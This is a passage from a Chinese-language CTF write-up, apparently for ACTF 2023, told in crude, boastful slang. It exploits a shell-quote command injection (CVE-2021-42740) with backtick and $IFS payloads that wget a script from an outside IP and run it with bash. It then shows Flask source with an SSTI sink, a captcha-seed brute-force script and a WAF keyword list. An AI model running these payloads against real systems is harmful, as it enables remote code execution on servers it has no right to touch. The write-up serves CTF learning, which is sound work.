class="line">      <span class="keyword">if</span> (code !== <span class="number">0</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Error executing command!!!`</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Ok...`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;No parameter provided.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>不多 bb, 就是打这个 checker 路由.</p><p>👴觉得 shellQuote,quote 很陌生，很不对劲，怎么办，搜 exp!</p><p>别跟👴说你不会搜，nmd 不要用国内的答辩引擎，上🥁🕊直接:shellQuote exploit</p><p>第一个就是了，其它都不好使:<a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">Exploiting CVE-2021-42740 (wh0.github.io)</a></p><p>不说人话:shell-quote 包通常用于转义不受信任的输入，以便在 shell 命令中使用。此示例采用不受信任的输入，引用它，并通过一个命令运行它，该命令将其打印出来。我们只希望它返回一个字符串，而不是允许不受信任的输入运行任意命令。假设我们在路径中调用 pwnme 了这个程序，如果它被执行，我们就失败了我们的安全目标：</p><p>有点难懂，来个 demo 试一下.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title class_">String</span>(s).<span class="title function_">replace</span>(<span class="regexp">/([A-z]:)?([#!&quot;$&amp;&#x27;()*,:;&lt;=&gt;?@\[\\\]^`&#123;|&#125;])/g</span>, <span class="string">&#x27;$1\\$2&#x27;</span>);</span><br></pre></td></tr></table></figure><p>最好在虚拟机上用，test.js 如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellQuote = <span class="built_in">require</span>(<span class="string">&#x27;shell-quote&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> untrusted = process.<span class="property">argv</span>[<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;untrusted&#x27;</span>, untrusted);</span><br><span class="line"><span class="keyword">const</span> result = childProcess.<span class="title function_">execSync</span>(shellQuote.<span class="title function_">quote</span>([<span class="string">&#x27;printf&#x27;</span>, <span class="string">&#x27;%s\n&#x27;</span>, untrusted]));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;result&#x27;</span>, result);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">&#x27;`:`./pwnme``:`&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;`:`pwnme``:`&#x27;</span></span><br></pre></td></tr></table></figure><p>相当于 untrsuted,👴直接就说了.</p><p>pwnme 输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/bin/</span>sh</span><br><span class="line">touch /tmp/i-am-pwned</span><br><span class="line">echo <span class="string">&quot;oh no&quot;</span></span><br></pre></td></tr></table></figure><p>输入命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">&#x27;`:`./pwnme``:`&#x27;</span></span><br></pre></td></tr></table></figure><p>直接就能执行 pwnme 里面的内容了</p><p>空格被 ban 怎么办，用 $IFS, 别这也要👴教.</p><p>你现在明白了怎么绘世了.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = shellQuote.<span class="title function_">quote</span>([<span class="string">&quot;nmap&quot;</span>, <span class="string">&quot;-p&quot;</span>, port, host]);</span><br></pre></td></tr></table></figure><p>现在也就是要控制 <code>port</code>  了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;127.0.0.1:`:`wget$IFS``:`</span></span><br></pre></td></tr></table></figure><p>$IFS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span>%<span class="number">09</span>%0A%<span class="number">00</span>%0A</span><br></pre></td></tr></table></figure><p>$9</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>先下载</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`wget$IFS$943.143.192.19:7777/a.sh``:`</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150210.png" alt="微信截图_20231031150210"></p><p>报错并无关系，已经执行力.</p><p>再执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS$9a.sh``:`</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150159.png" alt="微信截图_20231031150159"></p><p>芜湖，奥利安费，太 tm 爽了.</p><p>👴顺便说一下，用斜杠也能绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS\a.sh``:`</span></span><br></pre></td></tr></table></figure><h1 id="story"><span id="story"> story</span></h1><p>これは、わたしの物語🤣,wcsndm 题目环境没了，自己本地搭 docker.</p><p>不过问题不大，因为👴魔改了一下源码，一样能和题目效果差不多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br></pre></td></tr></table></figure><p>为了保证题目密钥的随机性，👴改成了这 b 玩意，👴可太 nb 了</p><p>不多 bb, 先上源码，让👴来看看怎么个事😊</p><h2 id="源码"><span id="源码"> 源码🤔</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/vip&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">&#x27;vip&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/story&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">story</span>():</span><br><span class="line">    story = session.get(<span class="string">&#x27;story&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> story <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> story != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        tpl = <span class="built_in">open</span>(<span class="string">&#x27;templates/story.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">return</span> render_template_string(tpl % story) </span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/write&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    story = request.json.get(<span class="string">&#x27;story&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;vip&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> minic_waf(story):</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">            session[<span class="string">&#x27;vip&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;no way~~~&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">&#x27;story&#x27;</span>] = story</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Please become a VIP first.&#x27;</span>&#125;), <span class="number">400</span></span><br></pre></td></tr></table></figure><p>👴只放了三个路由，不是懒，而是没有必要，你用不着这么多了🤣</p><p>很明显，最终利用点就是 story 路由下的 render_template_string, 众所周知，这是 SSTI 的触发点.</p><p>但是参数是从 session 里面取出来的，你能伪造吗，那怎么说也得拿到 SECRET_KEY 啊，怎么拿到呢，通过 stroy 路由 ssti拿到，那我怎么 ssti, 先伪造 session, 那我怎么伪造 session, 先拿到 SECRET_KEY, 那我怎么拿到 SCECRET_KEY 呢，先 ssti…</p><p>坑爹呢！这是，😓(bushi)</p><p>好吧，正解其实是:</p><p>通过 write 路由写 session 的 story, 但是 write 路由利用有个条件，要伪造 vip, 那怎么伪造 vip, 那必然是先拿到 SECRET_KEY… 我说婷婷，打住，没完了是吧🤪.</p><p>vip 路由下能够让我们 session 中的 vip 为 true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">&#x27;vip&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/story&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure><p>不过条件是 generate_code 等于传入的 captcha, 而 generate_code 的生成逻辑是随机的四位，而且每访问一次都会变，直接爆破的人建议魔法披风.</p><p>我看看这个 captcha 的生成是怎么个事</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">4</span></span>):</span><br><span class="line">    characters = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br></pre></td></tr></table></figure><p>这玩个 p 啊，随机生成，我看看这个 class 怎么个事</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Captcha</span>:</span><br><span class="line">    lookup_table: t.<span class="type">List</span>[<span class="built_in">int</span>] = [<span class="built_in">int</span>(i * <span class="number">1.97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width: <span class="built_in">int</span> = <span class="number">160</span>, height: <span class="built_in">int</span> = <span class="number">60</span>, key: <span class="built_in">int</span> = <span class="literal">None</span>, length: <span class="built_in">int</span> = <span class="number">4</span>, </span></span><br><span class="line"><span class="params">                 fonts: t.<span class="type">Optional</span>[t.<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>, font_sizes: t.<span class="type">Optional</span>[t.<span class="type">Tuple</span>[<span class="built_in">int</span>]] = <span class="literal">None</span></span>):</span><br><span class="line">        self._width = width</span><br><span class="line">        self._height = height</span><br><span class="line">        self._length = length</span><br><span class="line">        self._key = (key <span class="keyword">or</span> <span class="built_in">int</span>(time.time())) + random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">        self._fonts = fonts <span class="keyword">or</span> DEFAULT_FONTS</span><br><span class="line">        self._font_sizes = font_sizes <span class="keyword">or</span> (<span class="number">42</span>, <span class="number">50</span>, <span class="number">56</span>)</span><br><span class="line">        self._truefonts: t.<span class="type">List</span>[FreeTypeFont] = []</span><br><span class="line">        random.seed(self._key)</span><br></pre></td></tr></table></figure><p>哦，原来是有种子的呀，那没事了 (nmsl).</p><p>这种子是当前时间戳的取证拼接 1 到 100 的随机数.</p><p>显然 time 我们可以自己本地生成，1 到 100 的随机数，凹概率你不会？爆破他个几百上千次，总能终出的.</p><p>终出不了也别干了，机器爆破这么多次，1 到 100 总得终出吧.🥵</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/vip&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure><p>为此我们需要访问 captcha, 每次以当前时间戳 + 随机数为种子重置这个对象，所以要先访问 captch, 再访问 /vip.</p><p>流程是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重置Captcha对象,以当前时间戳加<span class="number">1</span>至<span class="number">100</span>随机数-&gt;gen.generate()生成第一次随机数-&gt;/vip路由调用generate_code随机生成</span><br></pre></td></tr></table></figure><p>因此，我们也需要对轴</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">  gen.generate()</span><br><span class="line">  requests.get(url1 + <span class="string">&quot;captcha&quot;</span>, headers=headers)</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>首先完成这些操作，然后访问 captcha 路由，此时轴对上了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">captcha = generate_code()</span><br></pre></td></tr></table></figure><p>接下来生成一次 generate_code (), 并且访问 vip, 此时步调一致了，倘若种子一样，这样的请求不到 1 秒能完成，不会改变时间戳，那么本地生成的 code 和题目一样，就能够拿到 vip 了</p><p>今は👴の勝利だ</p><p>これが👴の最後のエクスポート！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> utils.captcha <span class="keyword">import</span> Captcha,generate_code</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url1 =<span class="string">&quot;http://127.0.0.1:15000/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://127.0.0.1:5001/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,</span><br><span class="line"></span><br><span class="line">                          <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span> ,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">    <span class="comment"># timekey = int(time.time())</span></span><br><span class="line"></span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">    gen.generate()</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    requests.get(url1 + <span class="string">&quot;captcha&quot;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># rawBody = &quot;&#123;\&quot;captcha\&quot;:\&quot;&quot;+captcha+&quot;\&quot;&#125;&quot;</span></span><br><span class="line">    json = &#123;<span class="string">&quot;captcha&quot;</span>: captcha&#125;</span><br><span class="line">    <span class="comment"># print(&quot;json:&quot; + f&quot;&#123;json&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    session = requests.session()</span><br><span class="line">    headers2 = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>:</span><br><span class="line">        <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;eyJjYXB0Y2hhIjoidHBUViJ9.ZUDlMw.Iwx2YVR3CqHYbpqySJWOEJX1hac&quot;</span>&#125;</span><br><span class="line">    res = session.post(url1 + <span class="string">&quot;vip&quot;</span>, json=json, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为爆破，凹概率，循环跑就行</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101112607.png" alt="微信截图_20231101112607"></p><p>哈哈哈！👴は一番の天才だ</p><p>有 waf, 面白い！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rule = [</span><br><span class="line">    [<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;config&#x27;</span>],                   <span class="comment"># rule 1</span></span><br><span class="line">    [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>],              <span class="comment"># rule 2</span></span><br><span class="line">    [<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;__&#x27;</span>,<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;.&#x27;</span>],                           <span class="comment"># rule 3</span></span><br><span class="line">    [<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>,<span class="string">&#x27;doc&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#123;\&#123;&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>],                          <span class="comment"># rule 4</span></span><br><span class="line">    [<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#123;\&#123;&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>],                          <span class="comment"># rule 5</span></span><br><span class="line">    [<span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;values&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>]                  <span class="comment"># rule 6</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">minic_waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    waf_seq = random.sample(<span class="built_in">range</span>(<span class="number">21</span>),<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> singel_waf(<span class="built_in">input</span>, rule[waf_seq[index]]):</span><br><span class="line">            <span class="keyword">return</span> <span 